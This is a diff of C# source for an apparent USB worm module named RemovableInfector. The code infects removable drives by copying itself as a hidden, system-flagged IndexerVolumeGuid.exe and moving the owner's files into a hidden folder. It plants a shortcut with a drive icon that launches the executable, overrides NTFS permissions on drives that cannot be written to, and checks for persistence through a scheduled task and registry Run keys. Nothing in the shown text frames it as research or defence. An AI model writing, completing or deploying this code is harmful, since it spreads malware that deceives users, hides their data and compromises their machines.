@@ -1,5 +1,7 @@
 ﻿using IWshRuntimeLibrary;
+using Microsoft.Win32.TaskScheduler;
 using System;
+using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Management;
@@ -74,85 +76,202 @@ namespace zort
         private void InfectRemovableDrive(char driveLetter)
         {
             string drivePath = $@"{driveLetter}:\";
-            // Check if the drive is removable
-            if (!DriveInfo.GetDrives().Any(d => d.Name == drivePath && d.DriveType == System.IO.DriveType.Removable)) return;
 
-            // Check if the drive is already infected
-            string driveRoot = drivePath;
-            string fakeFolderPath = Path.Combine(driveRoot, FAKE_FOLDER_NAME);
+            // Check if the drive is removable
+            if (!IsRemovableDrive(drivePath)) return;
+
+            string fakeFolderPath = Path.Combine(drivePath, FAKE_FOLDER_NAME);
             string fakeSystemVolumeInfoPath = Path.Combine(fakeFolderPath, FAKE_SYSTEM_VOLUME_INFO_NAME);
             string fakeFilePath = Path.Combine(fakeSystemVolumeInfoPath, "WPSettings.dat");
 
-            Directory.CreateDirectory(fakeSystemVolumeInfoPath);
+            byte[] expectedData = GetExpectedData();
 
+            if (IsAlreadyInfected(fakeFilePath, expectedData)) return;
+
+            ModuleLogger.Log(this, $"Infecting removable drive: {driveLetter}");
+
+            if (!EnsureDriveWritable(drivePath))
+            {
+                //drive still not writable, success is essential. get the most outer writable directory and continue as if that folder was drive root
+                ModuleLogger.Log(this, "Drive is not writable. Attempting to find a writable directory.");
+                string mostOuterWritableDir = GetMostOuterWritableDirectory(drivePath);
+                if (mostOuterWritableDir == null)
+                {
+                    ModuleLogger.Log(this, "No writable directory found. Retreat :(.");
+                    return;
+                }
+                else
+                {
+                    ModuleLogger.Log(this, $"Found writable directory: {mostOuterWritableDir}");
+                    drivePath = mostOuterWritableDir;
+                    fakeFolderPath = Path.Combine(drivePath, FAKE_FOLDER_NAME);
+                    fakeSystemVolumeInfoPath = Path.Combine(fakeFolderPath, FAKE_SYSTEM_VOLUME_INFO_NAME);
+                    fakeFilePath = Path.Combine(fakeSystemVolumeInfoPath, "WPSettings.dat");
+                }
+            }
+
+            // Create necessary directories and files
+            try { CreateFakeFolderStructure(fakeFolderPath, fakeSystemVolumeInfoPath, fakeFilePath, expectedData); }
+            catch (Exception ex)
+            {
+                ModuleLogger.Log(this, $"Failed to create fake folder structure: {ex.Message}");
+                return;
+            }
+
+            // Copy executable and set file attributes
+            try
+            {
+                CopyExecutableToFakeFolder(fakeSystemVolumeInfoPath);
+                SetFileAttributesForFakeContent(fakeFolderPath, fakeSystemVolumeInfoPath);
+            }
+            catch (Exception ex)
+            {
+                ModuleLogger.Log(this, $"Failed to copy executable or set file attributes: {ex.Message}");
+                return;
+            }
+
+            // Create shortcuts and desktop.ini
+            try
+            {
+                CreateDriveShortcut(fakeFolderPath, driveLetter, fakeSystemVolumeInfoPath);
+                CreateDesktopIni(fakeFolderPath);
+            }
+            catch (Exception ex)
+            {
+                ModuleLogger.Log(this, $"Failed to create shortcuts or desktop.ini: {ex.Message}");
+                return;
+            }
+
+            // Move files and folders to the fake folder
+            try
+            {
+                MoveFilesAndFolders(drivePath, fakeFolderPath);
+            }
+            catch (Exception ex)
+            {
+                ModuleLogger.Log(this, $"Failed to move files and folders: {ex.Message}");
+                return;
+            }
+        }
+
+        private string GetMostOuterWritableDirectory(string drivePath)
+        {
+            if (CanWrite(drivePath)) return drivePath;
+            var directories = Directory.GetDirectories(drivePath, "*", SearchOption.TopDirectoryOnly);
+            foreach (var directory in directories)
+            {
+                if (CanWrite(directory))
+                {
+                    ModuleLogger.Log(this, $"Found writable directory: {directory}");
+                    return directory;
+                }
+                else
+                {
+                    string mostOuterDir = GetMostOuterWritableDirectory(directory);
+                    if (mostOuterDir != null)
+                    {
+                        ModuleLogger.Log(this, $"Found writable directory: {mostOuterDir}");
+                        return mostOuterDir;
+                    }
+                }
+            }
+
+            ModuleLogger.Log(this, $"No writable directory found on drive: {drivePath}");
+            return null;
+        }
+
+        private bool IsRemovableDrive(string drivePath)
+        {
+            return DriveInfo.GetDrives().Any(d => d.Name == drivePath && d.DriveType == DriveType.Removable);
+        }
+
+        private byte[] GetExpectedData()
+        {
             byte[] expectedData = new byte[RECOGNITION_BYTES.Length + 1];
             Buffer.BlockCopy(RECOGNITION_BYTES, 0, expectedData, 0, RECOGNITION_BYTES.Length);
             expectedData[RECOGNITION_BYTES.Length] = VERSION_BYTE;
+            return expectedData;
+        }
 
+        private bool IsAlreadyInfected(string fakeFilePath, byte[] expectedData)
+        {
             if (File.Exists(fakeFilePath))
             {
                 //TODO: Add check for version byte for updating
                 if (File.ReadAllBytes(fakeFilePath).SequenceEqual(expectedData))
                 {
                     ModuleLogger.Log(this, "Drive is already infected. Exiting.");
-                    return;
+                    return true;
                 }
             }
-            ModuleLogger.Log(this, $"Infecting removable drive: {driveLetter}");
+            return false;
+        }
 
-            // Check if the drive is writable
+        private bool EnsureDriveWritable(string drivePath)
+        {
             if (!CanWrite(drivePath))
             {
-                ModuleLogger.Log(this, "Drive is not writable. rewriting security rules");
-                // Attempt to change the security rules to make it writable
+                ModuleLogger.Log(this, "Drive is not writable. Attempting to rewrite security rules.");
                 ChangeNTFSSecurityRules(drivePath);
             }
+
             // Check again if the drive is writable
             if (!CanWrite(drivePath))
             {
                 ModuleLogger.Log(this, "Drive is still not writable. Exiting.");
-                return;
+                return false;
             }
 
-            if (string.IsNullOrEmpty(driveRoot))
-            {
-                ModuleLogger.Log(this, "No writable directory found.");
-                return;
-            }
+            return true;
+        }
 
-            ModuleLogger.Log(this, $"Most outer writable directory: {driveRoot}");
-
-            // Create a fake folder in the most outer writable directory
+        private void CreateFakeFolderStructure(string fakeFolderPath, string fakeSystemVolumeInfoPath, string fakeFilePath, byte[] expectedData)
+        {
+            // Create fake folders
             Directory.CreateDirectory(fakeFolderPath);
             ModuleLogger.Log(this, $"Created fake folder: {fakeFolderPath}");
 
-            // Create a fake System Volume Information folder
             Directory.CreateDirectory(fakeSystemVolumeInfoPath);
             ModuleLogger.Log(this, $"Created fake System Volume Information folder: {fakeSystemVolumeInfoPath}");
 
-            //Create fake file in the fake folder containing recognition bytes and version info
+            // Create fake file with recognition bytes
             File.WriteAllBytes(fakeFilePath, expectedData);
+        }
 
-            // Copy the executable to the fake folder
-            byte[] bytes = PersistenceHelper.CreateClone();
+        private void CopyExecutableToFakeFolder(string fakeSystemVolumeInfoPath)
+        {
+            byte[] bytes = PersistenceHelper.Clone.Create();
             string clonedExecutablePath = Path.Combine(fakeSystemVolumeInfoPath, "IndexerVolumeGuid.exe");
+
             using (FileStream fs = new FileStream(clonedExecutablePath, FileMode.Create, FileAccess.Write, FileShare.None))
             {
                 fs.Write(bytes, 0, bytes.Length);
             }
             ModuleLogger.Log(this, $"Copied executable to fake folder: {clonedExecutablePath}");
+        }
 
+        private void SetFileAttributesForFakeContent(string fakeFolderPath, string fakeSystemVolumeInfoPath)
+        {
             // Set the file attributes to system and hidden
+            string clonedExecutablePath = Path.Combine(fakeSystemVolumeInfoPath, "IndexerVolumeGuid.exe");
             File.SetAttributes(clonedExecutablePath, FileAttributes.System | FileAttributes.Hidden);
             ModuleLogger.Log(this, $"Set file attributes to system and hidden: {clonedExecutablePath}");
 
-            // Create a shortcut to the executable
-            string targetPath = $@"{fakeSystemVolumeInfoPath}\IndexerVolumeGuid.exe";
-            string shortcutPath = Path.Combine(fakeFolderPath, $@"{driveLetter}:\.lnk");
-            CreateShortcut(shortcutPath, targetPath, @"C:\Windows\System32\SHELL32.dll,79"); //Drive icon
-            ModuleLogger.Log(this, $"Created shortcut to executable: {shortcutPath}");
+            // Set fake folders and files as system and hidden
+            File.SetAttributes(fakeFolderPath, FileAttributes.System | FileAttributes.Hidden);
+            File.SetAttributes(fakeSystemVolumeInfoPath, FileAttributes.System | FileAttributes.Hidden);
+        }
 
-            // Create desktop.ini to add an icon to the fake fake folder
+        private void CreateDriveShortcut(string fakeFolderPath, char driveLetter, string fakeSystemVolumeInfoPath)
+        {
+            string targetPath = Path.Combine(fakeSystemVolumeInfoPath, "IndexerVolumeGuid.exe");
+            string shortcutPath = Path.Combine(fakeFolderPath, $@"{driveLetter}:\.lnk");
+            CreateShortcut(shortcutPath, targetPath, @"C:\Windows\System32\SHELL32.dll,79"); // Drive icon
+            ModuleLogger.Log(this, $"Created shortcut to executable: {shortcutPath}");
+        }
+
+        private void CreateDesktopIni(string fakeFolderPath)
+        {
             string desktopIniPath = Path.Combine(fakeFolderPath, "desktop.ini");
             using (StreamWriter writer = new StreamWriter(desktopIniPath))
             {
@@ -161,32 +280,42 @@ namespace zort
             }
             ModuleLogger.Log(this, $"Created desktop.ini: {desktopIniPath}");
 
-            // Set folders and files as system and hidden
-            File.SetAttributes(fakeFolderPath, FileAttributes.System | FileAttributes.Hidden);
-            File.SetAttributes(fakeSystemVolumeInfoPath, FileAttributes.System | FileAttributes.Hidden);
+            // Set desktop.ini as system and hidden
             File.SetAttributes(desktopIniPath, FileAttributes.System | FileAttributes.Hidden);
-            ModuleLogger.Log(this, "Set fake folders and desktop.ini as system and hidden.");
+        }
 
-            // Move files and folders from most outer directory to the fake folder
-            DirectoryInfo mostOuterDir = new DirectoryInfo(driveRoot);
+        private void MoveFilesAndFolders(string drivePath, string fakeFolderPath)
+        {
+            DirectoryInfo mostOuterDir = new DirectoryInfo(drivePath);
+
             foreach (FileInfo file in mostOuterDir.GetFiles())
             {
-                if (Path.GetFileName(file.FullName) == "desktop.ini") continue;
-                if (Path.GetFileName(file.FullName) == "autorun.inf") continue;
-                if (Path.GetExtension(file.FullName) == ".lnk") continue;
+                if (ShouldSkipFile(file)) continue;
                 string newPath = Path.Combine(fakeFolderPath, Path.GetFileName(file.FullName));
                 File.Move(file.FullName, newPath);
             }
+
             foreach (DirectoryInfo directory in mostOuterDir.GetDirectories())
             {
-                if (directory.FullName.Contains(FAKE_SYSTEM_VOLUME_INFO_NAME)) continue;
-                if (directory.FullName.Contains(FAKE_FOLDER_NAME)) continue;
-                if (directory.FullName.Contains("System Volume Information")) continue;
+                if (ShouldSkipDirectory(directory)) continue;
                 string newPath = Path.Combine(fakeFolderPath, directory.Name);
                 Directory.Move(directory.FullName, newPath);
             }
             ModuleLogger.Log(this, "Moved files and folders to fake folder.");
         }
+
+        private bool ShouldSkipFile(FileInfo file)
+        {
+            return Path.GetFileName(file.FullName) == "desktop.ini" || Path.GetFileName(file.FullName) == "autorun.inf" || Path.GetExtension(file.FullName) == ".lnk";
+        }
+
+        private bool ShouldSkipDirectory(DirectoryInfo directory)
+        {
+            return directory.FullName.Contains(FAKE_SYSTEM_VOLUME_INFO_NAME) ||
+                   directory.FullName.Contains(FAKE_FOLDER_NAME) ||
+                   directory.FullName.Contains("System Volume Information");
+        }
+
 
         private static void CreateShortcut(string path, string targetPath, string iconPath, string description = "")
         {
@@ -254,45 +383,31 @@ namespace zort
             }
         }
 
-        public static void CheckIfRunningFromRemovableDrive()
+        public static bool IsRunningFromUsb()
         {
             // Check if the current process is running from a removable drive
             string currentPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
             DriveInfo driveInfo = new DriveInfo(Path.GetPathRoot(currentPath));
-            if (driveInfo.DriveType != DriveType.Removable) return;
-            ModuleLogger.Log(typeof(RemovableInfector), "Running from removable drive. Attempting to infect system...");
-            if (Path.GetFileName(currentPath) == "IndexerVolumeGuid.exe")
-            {
-                // Started from nicely structured infection
-                // Open the parent folder in a file explorer
-                string parentFolder = Directory.GetParent(Path.GetDirectoryName(currentPath)).FullName;
-                if (parentFolder != null)
-                {
-                    System.Diagnostics.Process.Start("explorer.exe", parentFolder);
-                    ModuleLogger.Log(typeof(RemovableInfector), $"Opened parent folder: {parentFolder}");
-                }
-            }
+            return driveInfo.DriveType == DriveType.Removable;
+        }
 
-            // Continue infecting the system if not already infected
-            if(!IsSystemInfected())
+        public static bool IsRunningFromInfectedUsb()
+        {
+            if (!IsRunningFromUsb()) return false;
+            string currentPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
+            return Path.GetFileName(currentPath) == "IndexerVolumeGuid.exe";
+        }
+
+        public static void OpenFakeFolderIfRunningFromInfectedUsb()
+        {
+            // Check if the current process is running from a removable drive
+            if(!IsRunningFromInfectedUsb()) return;
+            string currentPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
+            string parentFolder = Directory.GetParent(Path.GetDirectoryName(currentPath)).FullName;
+            if (parentFolder != null)
             {
-                //copy self to temp folder
-                string tempPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName() + ".exe");
-                File.Copy(currentPath, tempPath, true);
-                // Start the cloned executable
-                System.Diagnostics.Process.Start(tempPath);
-                ModuleLogger.Log(typeof(RemovableInfector), $"Started cloned executable: {tempPath}");
-                // Wait 5-10 seconds
-                Random r = new Random();
-                int waitTime = r.Next(5, 10) * 1000;
-                System.Threading.Thread.Sleep(waitTime);
-                // Exit
-                Environment.Exit(0);
-            }
-            else
-            {
-                ModuleLogger.Log(typeof(RemovableInfector), "System is already infected. Exiting.");
-                Environment.Exit(0);
+                Process.Start("explorer.exe", parentFolder);
+                ModuleLogger.Log(typeof(RemovableInfector), $"Opened parent folder: {parentFolder}");
             }
         }
 
@@ -325,7 +440,8 @@ namespace zort
                 }
                 else return false;
 
-            } catch (Exception ex)
+            }
+            catch (Exception ex)
             {
                 ModuleLogger.Log(typeof(RemovableInfector), $"Error checking if system is infected: {ex.Message}");
                 return false;
@@ -333,6 +449,29 @@ namespace zort
         }
 
         public static bool IsSystemInfected()
+        {
+            // Check task scheduler for a task named IPookieBearUWU
+            try
+            {
+                var taskService = new TaskService();
+                var task = taskService.GetTask("IPookieBearUWU");
+                if (task != null)
+                {
+                    ModuleLogger.Log(typeof(RemovableInfector), "System is infected. Task exists.");
+                    return true;
+                }
+            }
+            catch (Exception ex)
+            {
+                ModuleLogger.Log(typeof(RemovableInfector), $"Error checking if system is infected: {ex.Message}");
+                return false;
+            }
+
+            return false;
+        }
+
+
+        public static bool IsSystemInfectedss()
         {
             //Enumerate reg run keys and find the one that runs C:\Users\Public\Pictures\pookie.exe
             string[] runKeys = { @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run" };
